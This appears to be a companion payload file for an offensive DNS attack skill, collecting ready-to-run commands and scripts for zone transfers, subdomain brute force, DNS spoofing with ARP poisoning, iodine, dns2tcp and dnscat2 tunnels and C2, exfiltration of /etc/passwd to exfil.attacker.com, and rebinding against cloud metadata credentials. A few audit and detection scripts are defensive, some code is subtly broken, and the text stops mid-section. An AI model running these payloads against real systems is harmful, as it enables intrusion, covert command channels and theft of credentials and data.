# DNS Attacks Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all DNS attack payloads organized by category.

---

## 1. Zone Transfer Attempts (AXFR)

Attempt full zone transfers against all discovered nameservers. A single misconfigured nameserver reveals the entire DNS infrastructure.

```bash
# dnsrecon - zone transfer against all nameservers
dnsrecon -d target.com -t axfr

# dnsrecon - zone transfer against specific nameserver
dnsrecon -d target.com -t axfr -n ns1.target.com

# dig - zone transfer attempt
dig axfr target.com @ns1.target.com
dig axfr target.com @ns2.target.com

# host - zone transfer attempt
host -l target.com ns1.target.com
host -l target.com ns2.target.com

# dnsenum - zone transfer (included in full enumeration)
dnsenum --enum target.com

# Batch zone transfer against multiple domains
for domain in $(cat domains.txt); do
  echo "=== $domain ==="
  dig axfr $domain @$(dig +short NS $domain | head -1)
done
```

### Zone Transfer Result Parsing

```python
#!/usr/bin/env python3
"""Parse zone transfer results and extract high-value records."""
import re

def parse_axfr_output(axfr_text):
    """Parse dig axfr output into structured records."""
    records = []
    for line in axfr_text.splitlines():
        line = line.strip()
        if not line or line.startswith(';'):
            continue
        parts = line.split()
        if len(parts) >= 4:
            records.append({
                'name': parts[0].rstrip('.'),
                'ttl': parts[1],
                'type': parts[3],
                'value': ' '.join(parts[4:])
            })
    return records

# Example usage with saved output
with open('axfr_output.txt') as f:
    records = parse_axfr_output(f.read())

print(f"Total records: {len(records)}")
for r in records:
    if r['type'] in ('A', 'AAAA', 'MX', 'NS', 'TXT', 'SRV'):
        print(f"  {r['name']} [{r['type']}] -> {r['value']}")
```

---

## 2. DNS Record Enumeration

Enumerate specific DNS record types to map services, mail servers, and infrastructure.

```bash
# A record (IPv4 address)
dig target.com A +noall +answer
dig www.target.com A +short

# AAAA record (IPv6 address)
dig target.com AAAA +noall +answer

# MX record (mail exchange)
dig target.com MX +noall +answer

# NS record (nameservers)
dig target.com NS +noall +answer

# TXT record (text records - SPF, DKIM, domain verification)
dig target.com TXT +noall +answer

# SOA record (start of authority)
dig target.com SOA +noall +answer

# SRV record (service records)
dig _sip._tcp.target.com SRV +noall +answer
dig _ldap._tcp.target.com SRV +noall +answer
dig _xmpp-server._tcp.target.com SRV +noall +answer
dig _kerberos._tcp.target.com SRV +noall +answer
dig _ldap._tcp.dc._msdcs.target.com SRV +noall +answer

# CNAME record (canonical name / alias)
dig www.target.com CNAME +noall +answer

# PTR record (reverse DNS)
dig -x 192.168.1.1 +noall +answer

# ANY record (all available records)
dig target.com ANY +noall +answer

# DNSKEY record (DNSSEC public key)
dig target.com DNSKEY +noall +answer

# CAA record (certificate authority authorization)
dig target.com CAA +noall +answer

# Enumerate all common record types
for type in A AAAA MX NS TXT SOA SRV CNAME PTR CAA; do
  echo "=== $type ==="
  dig target.com $type +noall +answer
done
```

### Bulk Record Harvesting Script

```bash
#!/bin/bash
# Harvest all DNS records for a list of domains
# Usage: ./dns_harvest.sh domains.txt
while read domain; do
    echo "=== $domain ==="
    for type in A AAAA MX NS TXT SOA CNAME; do
        result=$(dig +short $domain $type 2>/dev/null)
        if [ -n "$result" ]; then
            echo "  [$type] $result"
        fi
    done
done < "$1"
```

---

## 3. Subdomain Enumeration

Discover subdomains through brute force, dictionary attacks, and search engine enumeration.

```bash
# dnsrecon - brute force subdomain enumeration
dnsrecon -d target.com -t brte -D /usr/share/wordlists/dnsrecon/namelist.txt

# dnsrecon - with custom wordlist
dnsrecon -d target.com -t brte -D /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

# dnsrecon - reverse lookup enumeration
dnsrecon -t rvl -r 192.168.1.0/24

# dnsrecon - SRV record enumeration
dnsrecon -d target.com -t srv

# dnsenum - full enumeration with brute force
dnsenum --enum target.com
dnsenum --enum target.com -f /usr/share/dnsenum/dns.txt

# dnsenum - with custom wordlist and threads
dnsenum --enum target.com -f /usr/share/wordlists/dnsrecon/namelist.txt --threads 10

# fierce - subdomain brute force
fierce --domain target.com
fierce --domain target.com --subbrute
fierce --domain target.com --wordlist /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnswalk - zone walk for misconfigurations
dnswalk target.com.

# Manual brute force with dig
for sub in $(cat /usr/share/wordlists/dnsrecon/namelist.txt); do
  result=$(dig +short $sub.target.com A)
  if [ -n "$result" ]; then
    echo "$sub.target.com -> $result"
  fi
done

# Bing enumeration via dnsenum (passive discovery)
dnsenum target.com --dnsserver 8.8.8.8
```

### Amass Passive Subdomain Discovery

```bash
# Amass enum - passive subdomain enumeration (no DNS resolution)
amass enum -passive -d target.com -o amass_passive.txt

# Amass enum - active enumeration with DNS resolution
amass enum -active -d target.com -o amass_active.txt

# Amass enum - brute force with custom wordlist
amass enum -brute -d target.com -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

# Amass enum - with DNS resolution and IP output
amass enum -active -d target.com -ip -o amass_with_ips.txt

# Combine results from multiple tools and deduplicate
cat amass_passive.txt dnsrecon_results.txt dnsenum_results.txt | sort -u > all_subdomains.txt
wc -l all_subdomains.txt
```

---

## 4. DNS Fingerprinting and Server Identification

Identify DNS server software, version, and configuration details.

```bash
# Query BIND version
dig @ns1.target.com version.bind chaos txt
dig @ns1.target.com version.bind chaos txt +short

# Query hostname
dig @ns1.target.com hostname.bind chaos txt

# Query server ID (for BIND)
dig @ns1.target.com id.server chaos txt

# Query authors (for BIND)
dig @ns1.target.com authors.bind chaos txt

# Test for open recursion (should REFUSE for external clients)
dig @ns1.target.com google.com
dig @ns1.target.com google.com +short

# Test for open recursion from external IP
# If this returns an IP address, recursion is enabled
dig @ns1.target.com www.example.com @ns1.target.com

# Check DNSSEC deployment
dig target.com A +dnssec +short
dig target.com DNSKEY +short
dig target.com DS +short

# Check EDNS support
dig @ns1.target.com target.com A +edns=0

# Fingerprint using fpdns (if available)
fpdns -s ns1.target.com

# Check if server supports TCP queries
dig +tcp target.com A @ns1.target.com

# Test for DNS amplify potential (open resolver)
dig @ns1.target.com target.com ANY
# Measure response size to calculate amplification factor
dig @ns1.target.com target.com ANY +dnssec | grep "MSG SIZE"
```

### DNS Server Benchmarking

```bash
# Compare response times between DNS servers
for server in 8.8.8.8 1.1.1.1 9.9.9.9 ns1.target.com; do
    echo -n "$server: "
    dig @$server target.com A +stats | grep "Query time"
done

# Test DNSSEC validation capability
dig @8.8.8.8 dnssec.works A +dnssec +short
dig @ns1.target.com dnssec.works A +dnssec +short
```

---

## 5. DNS Spoofing with dnschef

Spoof DNS responses to redirect victims to attacker-controlled servers.

```bash
# Basic DNS spoofing - redirect all queries to attacker IP
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0

# Spoof specific domains only
dnschef --interface 0.0.0.0 --file spoof_hosts.ini

# Spoof with external nameserver for non-targeted queries
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --nameserver 8.8.8.8

# Spoof only specific domain
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --fakedomain target.com,mail.target.com

# Spoof with custom configuration file
cat > spoof_hosts.ini << 'EOF'
[A]
target.com = 192.168.1.100
www.target.com = 192.168.1.100
mail.target.com = 192.168.1.100
EOF
dnschef --interface 0.0.0.0 --file spoof_hosts.ini

# DNS spoofing with ARP poisoning for MITM
# Terminal 1: ARP spoofing
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Terminal 2: DNS spoofing
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0

# Terminal 3 (optional): Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoofing with iptables redirect (transparent DNS proxy)
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
dnschef --interface 0.0.0.0 --port 5353 --fakeip 192.168.1.100
```

### Ettercap DNS Spoof Module

```bash
# Create ettercap DNS spoof file
cat > /usr/share/ettercap/etter.dns << 'EOF'
target.com        A   192.168.1.100
*.target.com      A   192.168.1.100
mail.target.com   A   192.168.1.100
EOF

# Run ettercap with DNS spoof plugin
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```

---

## 6. DNS Tunneling with iodine

Establish IP-over-DNS tunnels to bypass network restrictions that allow DNS but block other protocols.

```bash
# Server side - start iodine server (needs authoritative DNS for tunnel domain)
# On attacker server with authoritative DNS configured:
iodined -f -P secretpassword 10.0.0.1/24 tunnel.attacker.com

# Server side with specific DNS port
iodined -f -P secretpassword 10.0.0.1/24 tunnel.attacker.com -p 5353

# Server side with maximum MTU
iodined -f -P secretpassword -m 1000 10.0.0.1/24 tunnel.attacker.com

# Client side - connect to iodine tunnel
iodine -f -P secretpassword dns.attacker.com tunnel.attacker.com

# Client side with specific DNS server
iodine -f -P secretpassword -s 8.8.8.8 tunnel.attacker.com

# Client side with maximum fragment size
iodine -f -P secretpassword -m 1000 dns.attacker.com tunnel.attacker.com

# After tunnel is established, verify connectivity
# Client should have tunnel interface (dns0 or similar) with IP 10.0.0.2
ping 10.0.0.1

# SSH through iodine tunnel
ssh -o ProxyCommand='iodine -P secretpassword dns.attacker.com tunnel.attacker.com' user@10.0.0.1

# Or SSH directly after tunnel is up
ssh user@10.0.0.1

# Set up routing through tunnel
ip route add 192.168.100.0/24 via 10.0.0.1 dev dns0
```

### Iodine Tunnel Performance Testing

```bash
# Test tunnel throughput
# On server: start iperf3
iperf3 -s -B 10.0.0.1

# On client: run iperf3 through tunnel
iperf3 -c 10.0.0.1 -t 30 -i 5

# Monitor tunnel interface
tcpdump -i dns0 -n -c 100

# Check tunnel DNS query rate
tcpdump -i eth0 -n port 53 -c 50 2>/dev/null | grep -c "A?"
```

---

## 7. DNS Tunneling with dns2tcp

Forward TCP connections over DNS queries for specific service access.

```bash
# Server side configuration
cat > dns2tcp.conf << 'EOF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty
domain = tunnel.attacker.com
resources = ssh:127.0.0.1:22,
            http:127.0.0.1:80,
            smtp:127.0.0.1:25
EOF

# Start dns2tcp server
dns2tcpd -f dns2tcp.conf
dns2tcpd -f dns2tcp.conf -d 2  # debug mode

# Client side - connect to SSH through DNS tunnel
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222
# Then: ssh -p 2222 user@localhost

# Client side - connect to HTTP through DNS tunnel
dns2tcpc -z tunnel.attacker.com -r http -l 8080
# Then: curl http://localhost:8080

# Client side with specific DNS server
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222 -s 8.8.8.8
```

### dns2tcp Multi-Resource Configuration

```bash
# Extended server config with more resources
cat > dns2tcp_extended.conf << 'EOF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty
domain = tunnel.attacker.com
resources = ssh:127.0.0.1:22,
            http:127.0.0.1:80,
            https:127.0.0.1:443,
            socks:127.0.0.1:1080,
            rdp:127.0.0.1:3389
EOF

# Start with extended configuration
dns2tcpd -f dns2tcp_extended.conf -d 3
```

---

## 8. DNS C2 with dnscat2

Establish encrypted command-and-control channels over DNS.

```bash
# Server side - start dnscat2
ruby dnscat2.rb tunnel.attacker.com

# Server side with shared secret
ruby dnscat2.rb --secret=MyS3cretK3y tunnel.attacker.com

# Server side with security settings
ruby dnscat2.rb --security=open tunnel.attacker.com

# Client side - Linux
ruby dnscat2.rb --secret MyS3cretK3y tunnel.attacker.com

# Client side - compiled binary
./dnscat tunnel.attacker.com

# After session established, server commands:
# List active sessions
sessions

# Interact with a session
session -i 1

# Tunnel through session (local port forwarding)
listen 127.0.0.1:8888 10.0.0.5:80

# Download file from client
download /etc/passwd

# Upload file to client
upload payload.sh /tmp/payload.sh

# Execute command on client
exec ifconfig
exec cat /etc/shadow

# Set delay between DNS queries (stealth)
delay 5000

# Set query type for stealth
set dns_type TXT
set dns_type CNAME
set dns_type MX
```

### dnscat2 Session Management

```bash
# Server: launch with domain and no encryption for testing
ruby dnscat2.rb --dns "domain=tunnel.attacker.com" --dns "host=0.0.0.0"

# List all active tunnels
tunnels

# Create a tunnel through an active session
tunnel create --session 1 --local 9999 --remote 3389

# Shutdown specific session
shutdown -s 1
```

---

## 9. DNS Exfiltration

Encode and exfiltrate data through DNS queries to attacker-controlled nameservers.

```bash
# Simple data exfiltration via DNS queries
# Encode data as hex subdomain labels
DATA="sensitive_data_here"
ENCODED=$(echo -n "$DATA" | xxd -p | fold -w 30 | head -1)
dig $ENCODED.exfil.attacker.com @attacker_dns

# File exfiltration - chunk and encode
FILE="/etc/passwd"
cat $FILE | xxd -p | fold -w 30 | while read chunk; do
  dig $chunk.exfil.attacker.com @attacker_dns_ip
  sleep 0.5
done

# File exfiltration with sequence numbers
SEQ=0
cat $FILE | xxd -p | fold -w 30 | while read chunk; do
  dig ${SEQ}.${chunk}.exfil.attacker.com @attacker_dns_ip
  SEQ=$((SEQ + 1))
  sleep 0.2
done

# Python DNS exfiltration script
python3 -c "
import dns.resolver
import os
import time

def exfiltrate_file(filepath, domain, dns_server):
    with open(filepath, 'rb') as f:
        data = f.read()
    hex_data = data.hex()
    chunks = [hex_data[i:i+30] for i in range(0, len(hex_data), 30)]
    for seq, chunk in enumerate(chunks):
        subdomain = f'{seq}.{chunk}.{domain}'
        try:
            dns.resolver.resolve(subdomain, 'A')
        except:
            pass
        time.sleep(0.1)
    print(f'Exfiltrated {len(chunks)} chunks')

exfiltrate_file('/etc/passwd', 'exfil.attacker.com', 'attacker_dns_ip')
"

# DNS exfiltration receiver (attacker nameserver)
# Use a custom DNS server that logs all queries
python3 -c "
from dnslib import DNSRecord, QTYPE
from dnslib.server import DNSServer, BaseResolver
import datetime

class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        timestamp = datetime.datetime.now().isoformat()
        with open('exfiltrated.log', 'a') as f:
            f.write(f'{timestamp} {qname}\n')
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A('127.0.0.1')))
        return reply

resolver = ExfilResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start()
print('DNS exfiltration server running on port 53')
"

# Base32-encoded exfiltration (DNS-safe characters)
DATA="secret data 123"
ENCODED=$(echo -n "$DATA" | base32 | tr -d '=' | tr 'A-Z0-9' 'a-z0-9')
dig $ENCODED.b32.exfil.attacker.com @attacker_dns_ip
```

### DNS Exfiltration Detection Script

```python
#!/usr/bin/env python3
"""Detect DNS exfiltration by analyzing query patterns in PCAP files."""
import subprocess
import re
from collections import Counter

def detect_dns_exfil(pcap_path, threshold=30):
    """Flag domains with abnormally long subdomain labels."""
    result = subprocess.run(
        ['tshark', '-r', pcap_path, '-Y', 'dns.qry.name',
         '-T', 'fields', '-e', 'dns.qry.name'],
        capture_output=True, text=True
    )

    domain_lengths = Counter()
    for query in result.stdout.strip().split('\n'):
        if query:
            parts = query.split('.')
            for part in parts:
                if len(part) > threshold:
                    domain_lengths[query] += 1

    suspicious = {k: v for k, v in domain_lengths.items() if v > 0}
    print(f"Suspicious long-label queries: {len(suspicious)}")
    for domain, count in sorted(suspicious.items(), key=lambda x: -x[1]):
        print(f"  [{count}x] {domain}")

    return suspicious
```

---

## 10. Reverse DNS Enumeration

Map IP addresses to hostnames through reverse DNS lookups.

```bash
# Single reverse lookup
dig -x 192.168.1.1 +noall +answer
host 192.168.1.1
nslookup 192.168.1.1

# Reverse lookup range with dnsrecon
dnsrecon -t rvl -r 192.168.1.0/24

# Manual reverse lookup sweep
for i in $(seq 1 254); do
  result=$(dig +short -x 192.168.1.$i)
  if [ -n "$result" ]; then
    echo "192.168.1.$i -> $result"
  fi
done

# Reverse lookup common internal ranges
for subnet in "10.0.0" "10.0.1" "172.16.0" "172.16.1" "192.168.0" "192.168.1"; do
  for i in $(seq 1 254); do
    result=$(dig +short -x ${subnet}.$i)
    if [ -n "$result" ]; then
      echo "${subnet}.$i -> $result"
    fi
  done
done

# Fast parallel reverse lookup with parallel
seq 1 254 | parallel -j 50 "result=\$(dig +short -x 192.168.1.{}); \
  [ -n \"\$result\" ] && echo 192.168.1.{} -\> \$result"
```

### Reverse DNS for Cloud IP Ranges

```bash
# Reverse lookup AWS-like ranges for cloud asset discovery
for subnet in "10.0.0" "10.0.1" "10.0.2" "10.1.0" "10.1.1"; do
    for i in $(seq 1 254); do
        result=$(dig +short -x ${subnet}.${i} 2>/dev/null)
        if [ -n "$result" ]; then
            echo "${subnet}.${i} -> $result"
        fi
    done
done

# Reverse lookup using nmap for faster scanning
nmap -sn 192.168.1.0/24 --dns-servers 192.168.1.1 -oG reverse_scan.gnmap
grep "Status: Up" reverse_scan.gnmap
```

---

## 11. DNS Cache Snooping

Check what domains have been recently resolved by a DNS server's cache.

```bash
# Non-recursive query to check if a domain is cached
dig @ns1.target.com +noall +answer +norecurse www.facebook.com A
dig @ns1.target.com +noall +answer +norecurse www.google.com A

# Batch cache snooping
for domain in facebook.com google.com youtube.com twitter.com github.com; do
  result=$(dig @ns1.target.com +norecurse +short $domain A)
  if [ -n "$result" ]; then
    echo "[CACHED] $domain -> $result"
  else
    echo "[NOT CACHED] $domain"
  fi
done

# Cache snooping for specific target domains (infrastructure discovery)
for domain in vpn.target.com mail.target.com owa.target.com intranet.target.com; do
  result=$(dig @ns1.target.com +norecurse +short $domain A)
  if [ -n "$result" ]; then
    echo "[CACHED] $domain -> $result"
  fi
done
```

---

## 12. DNS Amplification and Reflection

Test for DNS amplification vulnerability on target nameservers.

```bash
# Measure query and response sizes
dig @ns1.target.com target.com ANY +dnssec +ignore

# Check amplification factor
dig @ns1.target.com isc.org ANY +dnssec +stats | grep "MSG SIZE"

# Test with specific query types for largest responses
dig @ns1.target.com target.com ANY +dnssec | wc -c
dig @ns1.target.com target.com TXT +dnssec | wc -c
dig @ns1.target.com target.com DNSKEY +dnssec | wc -c

# Verify open recursion (amplification requires open resolver)
dig @ns1.target.com google.com +short
# If IP returned, server is open resolver and can be used for amplification
```

### Amplification Factor Calculator

```bash
#!/bin/bash
# Calculate DNS amplification factor for a resolver
RESOLVER=$1
DOMAIN=${2:-"isc.org"}

if [ -z "$RESOLVER" ]; then
    echo "Usage: $0 <resolver_ip> [domain]"
    exit 1
fi

# Measure query size
QUERY_SIZE=$(echo -n "$DOMAIN" | wc -c)
QUERY_SIZE=$((QUERY_SIZE + 20))  # DNS header overhead

# Measure response size
RESPONSE_SIZE=$(dig @$RESOLVER $DOMAIN ANY +dnssec +ignore 2>/dev/null | wc -c)

if [ "$RESPONSE_SIZE" -gt 0 ]; then
    FACTOR=$(echo "scale=1; $RESPONSE_SIZE / $QUERY_SIZE" | bc)
    echo "Query size: ~${QUERY_SIZE} bytes"
    echo "Response size: ${RESPONSE_SIZE} bytes"
    echo "Amplification factor: ${FACTOR}x"
else
    echo "No response received (server may block ANY queries)"
fi
```

---

## 13. DNS Rebinding Attacks

Configure DNS to alternate between attacker IP and target IP to bypass same-origin policy.

```bash
# DNS rebinding with short TTL
# Configure attacker nameserver with:
# - First query returns attacker IP (1.2.3.4)
# - Second query returns target IP (127.0.0.1 or 169.254.169.254)
# - TTL set to 0 or 1 second

# Using rbndr.us public rebinding service
# Format: <hex-ip1>.<hex-ip2>.rbndr.us
# 127.0.0.1 = 7f000001, 169.254.169.254 = a9fea9fe
curl "http://7f000001.a9fea9fe.rbndr.us/"

# Custom DNS rebinding nameserver using Python
python3 -c "
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, BaseResolver
import itertools

class RebindResolver(BaseResolver):
    def __init__(self):
        self.counter = itertools.cycle([0, 1])
        self.ips = ['1.2.3.4', '127.0.0.1']

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        idx = next(self.counter)
        ip = self.ips[idx]
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start()
print('DNS rebinding server running - alternating between 1.2.3.4 and 127.0.0.1')
"
```

### DNS Rebinding SSRF Test Harness

```bash
# Test DNS rebinding against SSRF-protected endpoints
# Step 1: Start rebinding server (above)
# Step 2: Configure your domain's NS record to point to attacker server
# Step 3: Test target SSRF endpoint

# Test AWS metadata endpoint access via rebinding
curl -v "http://rebind.attacker.com/latest/meta-data/iam/security-credentials/"

# Test with timing to hit second resolution
for i in $(seq 1 10); do
    echo "Attempt $i:"
    curl -s -o /dev/null -w "%{http_code}" "http://rebind.attacker.com:8080/admin"
    echo
    sleep 1
done
```

---

## 14. dnswalk - DNS Zone Auditing

Audit DNS zones for misconfigurations and security issues.

```bash
# Basic zone walk
dnswalk target.com.

# Walk with detailed output
dnswalk -d target.com.

# Walk specific subdomain zone
dnswalk sub.target.com.

# Interactive mode
dnswalk -i target.com.

# Output interpretation:
# GOOD  = correct delegation
# BAD   = delegation problem
# WARN  = potential issue
# FAIL  = serious error
```

### DNS Zone Security Audit

```bash
# Automated zone security audit combining multiple checks
#!/bin/bash
DOMAIN=${1:-"target.com"}
echo "=== DNS Security Audit: $DOMAIN ==="

echo "[1] Checking zone transfer..."
dig axfr $DOMAIN @$(dig +short NS $DOMAIN | head -1) 2>/dev/null | grep -c "XFR" && echo "VULN: Zone transfer open" || echo "OK: Zone transfer blocked"

echo "[2] Checking DNSSEC..."
dig $DOMAIN DNSKEY +short 2>/dev/null | head -1 && echo "OK: DNSSEC configured" || echo "WARN: No DNSSEC"

echo "[3] Checking CAA records..."
dig $DOMAIN CAA +short 2>/dev/null | head -1 || echo "WARN: No CAA records"

echo "[4] Checking SPF..."
dig $DOMAIN TXT +short | grep "v=spf1" || echo "WARN: No SPF record"

echo "[5] Checking DMARC..."
dig _dmarc.$DOMAIN TXT +short | grep "v=DMARC1" || echo "WARN: No DMARC record"

echo "[6] Checking DKIM..."
dig default._domainkey.$DOMAIN TXT +short | head -1 || echo "WARN: No DKIM record found"
```

---

## 15. Custom DNS Query Scripts

Python scripts for automated DNS testing and data extraction.

```python
"""
Automated DNS enumeration script using dnspython.
Discovers subdomains through multiple techniques and validates results.
"""
import dns.resolver
import dns.query
import dns.zone
import dns.reversename
import socket

def enumerate_zone_transfer(domain, nameserver):
    """Attempt zone transfer against a nameserver."""
    try:
        zone = dns.zone.from_xfr(dns.query.xfr(nameserver, domain))
        records = []
        for name, node in zone.nodes.items():
            for rdataset in node.rdatasets:
                records.append(f"{name}.{domain} {rdataset}")
        return records
    except Exception as e:
        return [f"Zone transfer failed: {e}"]

def enumerate_records(domain, record_type):
    """Query specific record type for a domain."""
    try:
        answers = dns.resolver.resolve(domain, record_type)
        return [str(rdata) for rdata in answers]
    except Exception:
        return []

def brute_force_subdomains(domain, wordlist_path):
    """Brute force subdomains using a wordlist."""
    found = []
    with open(wordlist_path) as f:
        words = [line.strip() for line in f if line.strip()]
    for word in words:
        subdomain = f"{word}.{domain}"
        try:
            ips = dns.resolver.resolve(subdomain, 'A')
            for ip in ips:
                found.append(f"{subdomain} -> {ip}")
                print(f"[FOUND] {subdomain} -> {ip}")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            pass
        except Exception:
            pass
    return found

def reverse_lookup(ip_range_start, ip_range_end):
    """Perform reverse DNS lookups on an IP range."""
    results = []
    start = list(map(int, ip_range_start.split('.')))
    end = list(map(int, ip_range_end.split('.')))
    for i in range(start[3], end[3] + 1):
        ip = f"{start[0]}.{start[1]}.{start[2]}.{i}"
        try:
            rev = dns.reversename.from_address(ip)
            hostname = str(dns.resolver.resolve(rev, 'PTR')[0])
            results.append(f"{ip} -> {hostname}")
        except Exception:
            pass
    return results
```

---

## 16. DNS-over-HTTPS (DoH) Tunneling

Use DoH to bypass traditional DNS monitoring and exfiltrate data through encrypted DNS channels.

```bash
# Perform DNS queries over HTTPS to evade DNS monitoring
curl -s -H "Accept: application/dns-json" "https://dns.google/resolve?name=target.com&type=A"

# Using doggo for DoH queries
doggo target.com @https://dns.google

# DoH-based data exfiltration (encode data as subdomain labels)
DATA="secret_data_here"
ENCODED=$(echo -n "$DATA" | base32 | tr -d '=' | tr 'A-Z0-9' 'a-z0-9')
curl -s -H "Accept: application/dns-json" "https://dns.google/resolve?name=${ENCODED}.exfil.attacker.com&type=A"
```

### DoH Provider Fingerprinting

```bash
# Test multiple DoH providers for data exfiltration capability
for provider in "https://dns.google/resolve" "https://cloudflare-dns.com/dns-query" "https://dns.quad9.net/dns-query"; do
    echo "Testing: $provider"
    curl -s -H "Accept: application/dns-json" "${provider}?name=target.com&type=A" | python3 -m json.tool 2>/dev/null | head -10
    echo
done
```

## 17. DNSSEC Subdomain Walking

Walk DNSSEC-enabled zones using NSEC records to discover all subdomains even when zone transfers are blocked.

```bash
# Enumerate subdomains via NSEC walking
dig target.com NSEC +dnssec +noall +answer

# Walk the zone by following NSEC chain
CURRENT="target.com"
for i in $(seq 1 50); do
  NEXT=$(dig $CURRENT NSEC +short +dnssec 2>/dev/null | awk '{print $1}')
  if [ -z "$NEXT" ] || [ "$NEXT" = "$CURRENT" ]; then
    break
  fi
  echo "Found: $NEXT"
  CURRENT="$NEXT"
done

# Use ldns-walk for automated NSEC walking
ldns-walk target.com

# Use dnsrecon for NSEC walking
dnsrecon -d target.com -t snoop --ns ns1.target.com
```

### NSEC3 Zone Walking

```bash
# NSEC3 requires hash cracking - use nsec3walker if available
# First collect NSEC3 parameters
dig target.com NSEC3PARAM +short

# Use dnsrecon for NSEC3 enumeration
dnsrecon -d target.com -t brte -D /usr/share/wordlists/dnsrecon/namelist.txt

# Manual NSEC3 hash cracking approach
python3 -c "
import hashlib
import dns.resolver

domain = 'target.com'
salt = ''  # Extract from NSEC3PARAM record
iterations = 1

with open('/usr/share/wordlists/dnsrecon/namelist.txt') as f:
    for word in f:
        word = word.strip()
        name = word + '.' + domain
        # NSEC3 hash: SHA1(salt + name)
        data = hashlib.sha1((name + salt).encode()).hexdigest()
        print(f'{word}: {data}')
" 2>/dev/null | head -20
```

## 18. DNS-Based Service Discovery

Discover internal services through DNS SRV records and service enumeration patterns.

```bash
# Common SRV record patterns for enterprise services
dig _kerberos._tcp.target.com SRV +short
dig _ldap._tcp.target.com SRV +short
dig _ldaps._tcp.target.com SRV +short
dig _sip._tcp.target.com SRV +short
dig _xmpp-server._tcp.target.com SRV +short
dig _imap._tcp.target.com SRV +short
dig _caldav._tcp.target.com SRV +short
dig _mongodb._tcp.target.com SRV +short
dig _mysql._tcp.target.com SRV +short
dig _postgres._tcp.target.com SRV +short

# Enumerate AD domain controllers via SRV
dig _ldap._tcp.dc._msdcs.target.com SRV +short
dig _kerberos._tcp.dc._msdcs.target.com SRV +short

# Batch SRV enumeration from a wordlist
for svc in kerberos ldap ldaps gc sip xmpp imap smtp caldav ftp ssh; do
  result=$(dig _${svc}._tcp.target.com SRV +short)
  if [ -n "$result" ]; then
    echo "[FOUND] ${svc}: $result"
  fi
done
```

### Active Directory DNS Discovery

```bash
# Complete AD DNS service enumeration
DOMAIN="target.com"

echo "=== Domain Controllers ==="
dig _ldap._tcp.dc._msdcs.$DOMAIN SRV +short
dig _kerberos._tcp.dc._msdcs.$DOMAIN SRV +short

echo "=== Global Catalog ==="
dig _gc._tcp.$DOMAIN SRV +short
dig _ldap._tcp.gc._msdcs.$DOMAIN SRV +short

echo "=== Kerberos KDC ==="
dig _kerberos._tcp.$DOMAIN SRV +short
dig _kpasswd._tcp.$DOMAIN SRV +short

echo "=== Site-specific ==="
dig _ldap._tcp.default-first-site-name._sites.$DOMAIN SRV +short

echo "=== Forest DNS Zones ==="
dig _ldap._tcp.forestdnszones.$DOMAIN SRV +short
dig _ldap._tcp.domaindnszones.$DOMAIN SRV +short
```

## 19. DNS Poisoning Resistance Testing

Test whether DNS resolvers validate responses properly against cache poisoning attacks.

```bash
# Test for predictable transaction IDs (weak resolver)
# Send multiple queries and check for sequential TXIDs
for i in $(seq 1 10); do
  dig @ns1.target.com target.com A +short +dnssec 2>/dev/null | head -1
  sleep 0.1
done

# Test for source port randomization
# A resolver using fixed source ports is vulnerable to Kaminsky attack
tcpdump -i eth0 -n port 53 -c 20 -w dns_port_test.pcap
# Analyze: tshark -r dns_port_test.pcap -Y "dns.qr==0" -T fields -e udp.srcport | sort -u | wc -l
# Low unique count = poor randomization = vulnerable

# Test for 0x20 encoding (case randomization) support
dig @ns1.target.com TaRgEt.CoM A +noall +question
# If response preserves mixed case, resolver supports 0x0 encoding
```

### DNS Cache Poisoning Simulation

```bash
#!/bin/bash
# Test DNS resolver's resistance to cache poisoning
RESOLVER=${1:-"8.8.8.8"}
TARGET_DOMAIN=${2:-"test.target.com"}

echo "=== DNS Cache Poisoning Resistance Test ==="
echo "Resolver: $RESOLVER"
echo "Target domain: $TARGET_DOMAIN"

# Test 1: Check for randomized source ports
echo "[1] Source port randomization test"
for i in $(seq 1 20); do
    dig @$RESOLVER $TARGET_DOMAIN A +retry=0 +time=1 2>/dev/null &
done
wait
tcpdump -r dns_port_test.pcap -Y "dns.qr==0" -T fields -e udp.srcport 2>/dev/null | sort -u | wc -l
echo "  (Should be 20+ unique ports)"

# Test 2: Check TTL compliance
echo "[2] TTL compliance test"
dig @$RESOLVER $TARGET_DOMAIN A +noall +answer +dnssec 2>/dev/null

# Test 3: DNSSEC validation
echo "[3] DNSSEC validation test"
dig @$RESOLVER dnssec-failed.org A +dnssec +short 2>/dev/null
echo "  (SERVFAIL = DNSSEC validation working)"
```

---

## 20. DNS Rebinding Payloads (Modern Chains)

Modern DNS rebinding goes beyond the classic two-IP alternation. Real engagements use multi-stage chains (RB-CLICK-style), public-suffix-list bypass, multiple A records served simultaneously, and browser timing tricks. The goal is to defeat the same-origin policy (SOP) and the host of anti-rebinding defenses shipped in modern browsers, frameworks, and routers (e.g., systemd-resolved's `localhost`-blocking, AWS IMDSv2 token requirements, Chrome's Private Network Access headers).

### Classic Two-IP Alternation (Anchor Pattern)

```bash
